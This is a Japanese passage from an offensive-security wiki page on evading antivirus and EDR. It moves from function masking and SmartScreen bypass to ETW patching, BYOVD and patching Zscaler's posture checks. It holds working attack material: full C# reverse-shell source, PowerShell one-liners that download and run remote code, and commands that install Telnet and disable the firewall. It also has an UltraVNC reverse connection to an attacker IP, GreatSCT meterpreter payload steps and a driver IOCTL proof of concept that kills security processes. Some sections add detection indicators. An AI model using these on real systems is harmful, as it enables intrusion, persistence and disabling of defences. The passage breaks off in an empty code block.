`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`は関数ごとのstubを出力し、`emitEndOfAsmFile()`はhandlerを出力します。出力ステージ間で共有されるシンボルを使えば、prologueから後で出力されるepilogueへ分岐できます。手動でnear `je`を出力する場合は、`0F 84`に続けて、4バイトのMC expression `target - address_after_je`を書き込みます。handlerへのcallとjumpは、代わりに`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力できます。変更のない未選択関数に対してpassは`false`を返す必要がありますが、PoCはこの場合に誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadataとpre-CRT初期化

PoCは、XOR keyと、loaderによってrelocationされる関数ポインターおよび実行時の長さを含む16バイトのレコードを`.funcmeta`に配置します。Cのフィールドは`uint32_t`ですが、handlerはレコードのオフセット`+8`にあるQWORDを読み取るため、長さとそのpaddingを消費し、レコードを`0x10`バイトずつ進みます。PEのsection名は8バイトまでなので、実行時の検索では`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、stubに元のentry-point RVAを保存して、`AddressOfEntryPoint`を書き換えます。このPIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+ importsを走査してすでにimport済みの`VirtualProtect`を解決し、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化時に`gs:[0xE8]`へsentinelを設定し、metadataにある各関数を呼び出します。常に読み取り可能なprologueは関数の開始位置を`gs:[0xF0]`に記録し、sentinelを検出すると、まだ平文のbodyをスキップします。その後epilogueが`call handler`を実行します。handlerが13個のレジスター（`0x68`バイト）を保存した後、`[rsp+0x68]`にあるreturn addressが変換後の関数の終端となるため、`end - start`をmetadataレコードに書き込めます。stubはすべてのbodyをマスキングした後、sentinelをクリアして`ImageBase + original_entry_point_RVA`へjumpします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じ対称型handlerを呼び出してbodyを復号します。最後の経路は追加されたepilogueへフォールスルーし、それ以前のreturnはすべて共有handlerへ直接jumpします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再マスキング後にhandlerの`ret`が呼び出し元のreturn addressを消費し、関数の戻り値を`RAX`に保持できます。<sup>[[38]](#references)[[39]](#references)</sup>

#### マスキング処理と解析上の指標

handlerは現在のレコードを特定し、固定長の可視prologue（このビルドでは`0x46`バイト）を飛ばします。残りの領域を`PAGE_EXECUTE_READWRITE`に変更し、低位のkey byteで1バイトずつXORした後、`PAGE_EXECUTE_READ`に設定します。同じループがentry時には復号し、通常のexit時には暗号化します。<sup>[[38]](#references)[[39]](#references)</sup>

この設計で特に有力な指標は次のとおりです。<sup>[[38]](#references)[[39]](#references)</sup>

- 実行可能な`.stub`内にあるentry pointと、keyおよびrelocation済みの`.text`ポインターを含む`.funcmet`セクション。
- pre-CRTでのPEB、import table、section tableの解析と、それに続く各metadataポインター経由のcall。
- 同一の`call`/`pop` PIC prologueと、1つのhandlerにリダイレクトされた多数のreturn箇所。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込み、その後の`VirtualProtect`による繰り返しの保護属性変更、およびimage-backedの実行可能ページへのバイト単位のXOR書き込み。

これはメモリスキャナー回避であり、暗号学的な保護ではありません。patch済みのファイルには元の平文bodyが残っており、デバッガーで`VirtualProtect`やXORループにbreakpointを設定すれば、実行中の関数をdumpできます。1バイトXOR、読み取り可能なmetadata、固定の`0x46`境界も、オフラインでの復元を容易にします。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotはスレッド単位ですが、変更されたコードページはプロセス全体で共有されます。そのため、並行または再帰的なentryにより、別の呼び出しが実行中なのに命令が再度toggleされる可能性があります。例外やnonlocal exitによって再マスキングが回避される場合もあります。堅牢な実装には、状態遷移の同期、`lpflOldProtect`を通じて返された実際の保護属性の復元、stub長のハードコード回避、x64のスタックアラインメントを考慮した`call`と`jmp`両経路の監査、実行可能バイトを書き換えた後の`FlushInstructionCache`呼び出しが必要です。Microsoftは、実行可能コードを変更する際の命令キャッシュの整合性を保つ責任は呼び出し側にあると明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行すると、この画面が表示されることがあります。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護するためのセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にレピュテーションベースの方式で動作します。つまり、ダウンロード数の少ないアプリケーションはSmartScreenを起動させ、警告を表示してエンドユーザーによるファイルの実行を防ぎます（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)です。インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元のURLも記録されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認する。</p></figcaption></figure>

> [!TIP]
> **信頼された**署名証明書で署名された実行ファイルでは、**SmartScreenは起動しない**点に注意してください。

payloadにMark of The Webが付くのを防ぐ非常に効果的な方法は、ISOのようなコンテナーに格納することです。これは、Mark-of-the-Web（MOTW）を**NTFS以外**のボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するため、payloadを出力コンテナーに格納するツールです。

使用例：

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使い、payload を ISO ファイルにパッケージして SmartScreen を bypass するデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows（ETW）は、アプリケーションやシステムコンポーネントが**イベントをログに記録**できる、Windows の強力なログ記録機構です。一方で、セキュリティ製品が悪意のある活動を監視・検知するためにも利用されます。

AMSI を無効化（bypass）するのと同様に、ユーザー空間プロセスの **`EtwEventWrite`** 関数を、イベントをログに記録せず即座に戻るようにすることもできます。これはメモリ内の関数にパッチを適用して即座に戻るようにし、そのプロセスの ETW ログ記録を事実上無効化する方法です。

詳しくは **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# バイナリをメモリ内に読み込む手法は以前から知られており、AV に検知されずに post-exploitation ツールを実行する優れた方法として、今も広く使われています。

payload はディスクに触れることなくメモリに直接読み込まれるため、プロセス全体で AMSI にパッチを適用することだけを考慮すればよくなります。

多くの C2 framework（sliver、Covenant、metasploit、CobaltStrike、Havoc など）は、C# assembly をメモリ内で直接実行する機能をすでに備えていますが、その方法はいくつかあります。

- **Fork\&Run**

**新しい使い捨てプロセスを起動**し、そのプロセスに post-exploitation の悪意あるコードを inject して実行し、完了後に新しいプロセスを終了させる方法です。この方法にはメリットとデメリットがあります。Fork and run 方式のメリットは、Beacon implant プロセスの**外部**で実行される点です。つまり、post-exploitation の処理中に問題が起きたり検知されたりしても、**implant が生き残る可能性が大幅に高くなります**。デメリットは、**行動検知**によって検知される可能性が**高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation の悪意あるコードを**自身のプロセス内に** inject する方法です。新しいプロセスの作成と AV によるスキャンを避けられますが、payload の実行中に問題が起きるとクラッシュする可能性があり、**beacon を失う可能性が大幅に高くなる**のがデメリットです。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly の読み込みについて詳しく知りたい場合は、こちらの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を参照してください。

C# Assemblies は**PowerShell から**読み込むこともできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t の動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を参照してください。

## .NET ツールの NativeAOT WebAssembly 再パッケージ（WasmForge）

通常の `execute-assembly` 手法では、認識可能な MSIL が残り、最終的に CLR が初期化されます。**WasmForge** は実行基盤を変更します。C# project を実験的な NativeAOT-LLVM WASI ターゲットへ移行し、WebAssembly に ahead-of-time コンパイルした後、その module を Wazero ベースの Windows PE host に埋め込みます。生成されたプロセスは対象の CLR、JIT、`dotnet` host を必要としないため、managed assembly の名前、CLR の読み込み、AMSI、.NET ETW のみに基づくルールから直接確認できなくなります。これは evasion／パッケージング手法であり、権限境界を bypass するものではありません。guest は元のツールと同じ権限を持ち、OS 上での動作も観測可能です。<sup>[[44]](#references)[[45]](#references)</sup>

### C# project のビルド

推奨されるビルド方法は、.NET 10 SDK、NativeAOT-LLVM workload、WASI SDK 24.0、linker、署名用の依存関係が含まれる、プロジェクトの Docker 環境を使うことです。`.csproj` は自動検出され、単一のビルドコマンドで移行、互換性パッチの適用、WASM のコンパイル、PE の生成、署名が実行されます。<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

トラブルシューティングや生成コードの確認では、プロセスを `wasmforge dotnet-migrate <dir>`、`wasmforge dotnet-patch <dir>`、`dotnet publish -c Release -r wasi-wasm`、最後に `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` に分けて実行します。ビルドイメージでは `wasm-component-ld` ラッパーも使用し、WASI Preview 2 のコンポーネントエンコーディングを回避して、埋め込みランタイムが想定するプレーンなモジュールを生成します。<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# と x64 Win32 のブリッジ

これは透過的な再コンパイルではありません。NativeAOT-WASI では Windows 向けの BCL 機能が欠けていたり、仕様が変更されていたりします。また、wasm32 ゲストは通常4バイトのポインタスロットを割り当てますが、x64 API は8バイトのポインタを返すことがあります。WasmForge は、以下の生成レイヤーによって両方の問題に対処します。<sup>[[44]](#references)</sup>

1. ソースパッチャーが AOT 固有のセマンティクスの違いを修正し、未対応のレジストリ、パイプ、WMI、ID、ディレクトリサービス、ファイルバージョン、LSA などの呼び出しを `Wf*` ヘルパーにリダイレクトします。
2. P/Invoke スキャナーが NativeAOT の `DirectPInvoke` マッピングを生成し、`[DllImport]` 呼び出しが、ゲスト内で宣言された DLL を動的に読み込むのではなく、リンクされた C ブリッジシンボルにバインドされるようにします。
3. ホストに渡すポインタには、C# では `ulong`、C では `uint64_t` を使用します。汎用ディスパッチャーが呼び出しをホストの Win32 ハンドラーに転送し、`out8_mask` が、上位半分を保持する必要がある本来の8バイト出力スロットを示します。マークされていない wasm32 形式の出力には、スナップショット／復元による保護を適用し、x64 の書き込みによって隣接する4バイトが破損しないようにします。
4. 専用のホストブリッジが、LSA チケットキャッシュへのアクセス、構造化された結果を伴う Kerberos／BCrypt 操作、TCP KDC 通信、LDAP クエリなど、汎用 syscall ディスパッチでは対応できない操作を処理します。

たとえば、`version.dll!VerQueryValueW` のラッパーは4つのホストアドレスを渡し、値ポインタと長さが8バイトの出力スロットであることを示すため、ビット2と3（`0xC`）を設定します。ラッパー自体は汎用のままで、DLL 名、エクスポート名、引数、マスクを `wf_call_v2` に渡します。ホスト側がポインタを変換し、ネイティブ API を呼び出します。<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 制限事項と検知の着眼点

リフレクションを多用するコード、動的アセンブリの読み込み、任意のネイティブコールバック、WASMメモリに返される複雑なx64構造体には、ツールごとのパッチが必要になる場合や、まったく動作しない場合があります。汎用のWASI Preview 2ソケットもno-opスタブに到達することがあるため、対応ツールではプロトコル固有のホストシムを使用します。機能が同等だと決めつけず、各コマンドをネイティブビルドと照合して検証してください。<sup>[[44]](#references)[[45]](#references)</sup>

この手法はテレメトリを移すものであり、ペイロードを不可視にするものではありません。検知の着眼点は、WASMモジュールを含む、または生成するPE、Wazeroのようなランタイムの挙動、通常とは異なるホスト／ゲスト間のメモリ割り当てとコピー、汎用的なWin32の直接ディスパッチ、署名やPEリソースの異常、さらにその結果として発生するAPI呼び出しやネットワークトラフィックに移る可能性があります。したがって、CLRロード、AMSI、.NET ETWイベントがないことを、プロセスが無害である証拠として扱うべきではありません。<sup>[[44]](#references)</sup>

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、**Attacker Controlled SMB shareにインストールされたインタープリター環境へのアクセス**を侵害したマシンに与えることで、他の言語を使って悪意のあるコードを実行できます。

SMB share上のインタープリターのバイナリと環境へのアクセスを許可することで、侵害したマシンの**メモリ内でこれらの言語による任意のコードを実行**できます。

リポジトリによると、Defenderは引き続きスクリプトをスキャンしますが、Go、Java、PHPなどを利用することで、**静的シグネチャをバイパスする柔軟性が高まります**。これらの言語で難読化していないランダムなリバースシェルスクリプトを使ったテストでは、成功が確認されています。

## 静的解析回避のためのWebAssembly再ホスティング

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stompingは、EDRやAVなどのセキュリティ製品のアクセストークンを操作します。トークンの権限を下げることで、プロセスの実行を継続させながら、特権を必要とする検査や修復アクションを実行できないようにできます。

これを防ぐため、Windowsは**外部プロセス**がセキュリティプロセスのトークンに対するハンドルを取得できないようにすることができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアの使用

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者のPCにChrome Remote Desktopを導入し、それを使って乗っ取りと永続化を行うのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows用のMSIファイルをクリックしてダウンロードします。
2. 被害者のPCでインストーラーをサイレント実行します（管理者権限が必要です）。`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻り、nextをクリックします。ウィザードで認証を求められるので、Authorizeボタンをクリックして続行します。
4. 必要な箇所を変更して、提示されたコマンドを実行します。`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin`パラメーターを使うと、GUIを使わずにPINを設定できます）。
 

## 高度な回避

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

回避は非常に複雑なトピックです。1つのシステム内で多くの異なるテレメトリソースを考慮する必要がある場合もあり、成熟した環境で完全に検知を免れるのはほぼ不可能です。

対処する環境ごとに、それぞれ異なる長所と短所があります。

高度な回避手法の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94)のこの講演をぜひご覧ください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

こちらも[@mariuszbit](https://twitter.com/mariuszbit)による、Defense in Depthにおける回避についての素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い手法**

### **Defenderが悪意のあるものとして検出する箇所を調べる**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使うと、**Defenderが悪意のあるものとして検出する箇所を特定するまでバイナリの一部を削除**し、該当部分を切り分けられます。\
**同じことを行う**別のツールに[**avred**](https://github.com/dobin/avred)があり、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)でWebサービスも提供されています。

### **Telnet Server**

Windows 10より前は、すべてのWindowsに（管理者として）インストールできる**Telnetサーバー**が付属していました。次のように実行できます。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システム起動時に**起動**するよう設定し、今すぐ**実行**します:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnetポートを変更（ステルス）し、ファイアウォールを無効化:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

こちらからダウンロードしてください: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setupではなく、binのダウンロードを選択してください)

**ホスト上で**: _**winvnc.exe**_を実行し、サーバーを設定します:

- _Disable TrayIcon_オプションを有効にする
- _VNC Password_にパスワードを設定する
- _View-Only Password_にパスワードを設定する

次に、バイナリの_**winvnc.exe**_と、新たに作成されたファイル_**UltraVNC.ini**_を**被害者のマシン**に移動します

#### **Reverse connection**

**攻撃者**は、自身の**ホスト上で**バイナリ`vncviewer.exe -listen 5900`を**実行**し、reverse **VNC connection**を受け付けられる状態にします。次に、**被害者のマシン上で**、winvncデーモン`winvnc.exe -run`を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`を実行します

**警告:** ステルス性を維持するため、次の操作は避けてください

- すでに実行中の場合は`winvnc`を起動しないでください。[popup](https://i.imgur.com/1SROTTl.png)が表示されます。`tasklist | findstr winvnc`で実行中か確認してください
- 同じディレクトリに`UltraVNC.ini`がない状態で`winvnc`を起動しないでください。[config window](https://i.imgur.com/rfMQWcf.png)が表示されます
- ヘルプを表示するために`winvnc -h`を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png)が表示されます

### GreatSCT

こちらからダウンロードしてください: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCTの内部:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に、`msfconsole -r file.rc` で **lister** を起動し、**xml payload** を実行します：

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在の Defender はプロセスを非常に速く終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルします：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

以下と一緒に使用します:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C#難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorを構築するためのPythonの使用例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel SpaceからAV/EDRを停止

Storm-2603は、ランサムウェアを投下する前にエンドポイント保護を無効化するため、**Antivirus Terminator**として知られる小型のコンソールユーティリティを利用しました。このツールは**脆弱だが*署名済み*のドライバーを独自に持ち込み**、それを悪用して、Protected-Process-Light（PPL）AVサービスでさえ阻止できない特権的なkernel操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済みドライバー**: ディスクに配置されるファイルは`ServiceMouse.sys`ですが、バイナリはAntiy Labsの「System In-Depth Analysis Toolkit」に含まれる、正規の署名付きドライバー`AToolsKrnl64.sys`です。ドライバーには有効なMicrosoft署名があるため、Driver-Signature-Enforcement（DSE）が有効でも読み込まれます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   1行目はドライバーを**カーネルサービス**として登録し、2行目はドライバーを起動します。これにより、`\\.\ServiceMouse`がユーザーランドからアクセス可能になります。
3. **ドライバーが公開するIOCTL**
   | IOCTL code | 機能                                    |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PIDを指定して任意のプロセスを終了する（Defender/EDRサービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードしてサービスを削除する |

   最小限のC proof-of-concept：
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD は user-mode の保護を完全に回避します。kernel で実行されるコードは、PPL/PP、ELAM、その他の hardening 機能に関係なく、*protected* process を開いたり、終了させたり、kernel object を改ざんしたりできます。

検出 / 緩和策
•  Microsoft の脆弱な driver の block list（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` の読み込みを拒否するようにします。
•  新しい *kernel* service の作成を監視し、world-writable directory から driver が読み込まれた場合や、allow-list に存在しない場合にアラートを出します。
•  user-mode から custom device object への handle が開かれた後に、不審な `DeviceIoControl` 呼び出しが行われていないか監視します。

### オンディスクのバイナリパッチによる Zscaler Client Connector の Posture Check の回避

Zscaler の **Client Connector** は device-posture rule をローカルで適用し、結果を他の component と通信するために Windows RPC に依存します。次の 2 つの設計上の弱点により、完全な回避が可能です。

1. Posture の評価は**完全に client-side**で行われます（boolean が server に送信されます）。
2. 内部 RPC endpoint は、接続する executable が Zscaler によって署名されていること（`WinVerifyTrust` 経由）だけを検証します。<sup>[[11]](#references)</sup>

**署名済みバイナリ 4 つにオンディスクでパッチを適用する**ことで、どちらの仕組みも無効化できます。

| バイナリ | パッチ対象の元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックが compliant になります |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP-ed ⇒ 署名なしの process を含め、あらゆる process が RPC pipe に接続できます |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換え |
| `ZSATunnel.exe` | tunnel の整合性チェック | 短絡化 |

最小限の patcher の抜粋:

```python
